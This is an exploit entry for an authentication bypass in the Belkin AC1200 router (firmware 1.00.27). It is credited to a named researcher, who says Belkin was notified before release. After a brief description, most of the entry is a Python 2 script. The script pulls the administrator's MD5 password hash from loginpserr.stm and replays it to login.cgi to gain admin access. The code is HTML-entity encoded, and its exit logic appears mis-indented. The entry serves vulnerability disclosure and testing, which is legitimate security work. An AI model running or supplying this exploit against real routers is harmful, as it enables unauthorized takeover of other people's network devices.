# Exploit Title: Belkin Router AC1200, Firmware: 1.00.27 - Authentication Bypass
# Date: 5/11/2016
# Exploit Author: Gregory Smiley
# Contact: gsx0r.sec@gmail.com
# Vendor Homepage: http://www.belkin.com
# Version: Firmware: 1.00.27
# Tested on:F9K1113 v1
 
 
#1. Description:
 
#The Belkin AC1200 is vulnerable to authentication bypass due to it performing client side
#authentication after you attempt to login after already having failed a login. That webpage, loginpserr.stm contains the md5 hash value of the administrators password. This can be
#exploited by extracting that hash value, and passing it in the pws field in a post request to
#login.cgi.
 
#I would like to note that I contacted Belkin on several occasions
#and gave them plenty of time to reply/fix the issue before releasing this entry.
 
 
 
#2. Proof:
 
#Line 55 of loginpserr.stm contains the javascript code:
 
#var password = "md5hashofpassword";
 
 
#3. Exploit:
&#039;&#039;&#039;
 
#!/usr/bin/python
 
 
import urllib
 
import urllib2
 
import sys
 
 
router = raw_input(&#039;Enter IP address of your AC1200 to test: &#039;)
 
page = urllib2.urlopen(&#039;http://&#039;+router+&#039;/loginpserr.stm&#039;).read()
 
test_page = page
 
 
vuln_string = &#039;var password = "&#039;
 
if vuln_string in test_page:
 
    print &#039;Router is vulnerable.&#039;
    answer = raw_input(&#039;Would you like to exploit the target? Y/N : &#039;)
 
 
else:
 
 
    print &#039;Router is not vulnerable.&#039;
    print &#039;exiting...&#039;
 
sys.exit()
 
 
if (answer == &#039;y&#039;) or (answer == &#039;Y&#039;):
 
 
    extract = test_page.split(vuln_string, 1)[1] #These two lines extract the leaked hash value
    _hash = extract.partition(&#039;"&#039;)[0] #from /loginpserr.stm using quotes as a delimiter
 
 
else:
 
 
    if (answer == &#039;n&#039;) or (answer == &#039;N&#039;):
        print &#039;exiting...&#039;
 
sys.exit()
 
 
#Assemble the POST request to /login.cgi
 
 
 
headers = {
 
 
&#039;Host&#039;: router,
 
&#039;Connection&#039;: &#039;keep-alive&#039;,
 
&#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0&#039;,
 
&#039;Accept&#039; : &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
 
&#039;Accept-Language&#039; : &#039;en-US,en;q=0.5&#039;,
 
&#039;Accept-Encoding&#039; : &#039;gzip, deflate&#039;,
 
&#039;Referer&#039; : &#039;http://&#039;+router+&#039;/&#039;,
 
&#039;Connection&#039;: &#039;keep-alive&#039;,
 
&#039;Content-Type&#039;: &#039;application/x-www-form-urlencoded&#039;
 
}
 
 
data = {
 
 
 
&#039;totalMSec&#039;:&#039;0&#039;,
 
&#039;pws&#039;: _hash,
 
&#039;url&#039;:&#039;status.stm&#039;,
 
&#039;arc_action&#039;:&#039;login&#039;,
 
&#039;pws_temp&#039;: &#039;&#039;
 
}
 
 
data = urllib.urlencode(data)
 
 
#Sends the POST request with the hash in the pws field
 
 
req = urllib2.Request(&#039;http://&#039;+router+&#039;/login.cgi&#039;, data, headers)
 
 
response = urllib2.urlopen(req)
 
the_page = response.read()
 
 
print &#039;Exploit successful.&#039;
 
print &#039;You are now free to navigate to http://&#039;+router+&#039;/ ...as admin ;)&#039;

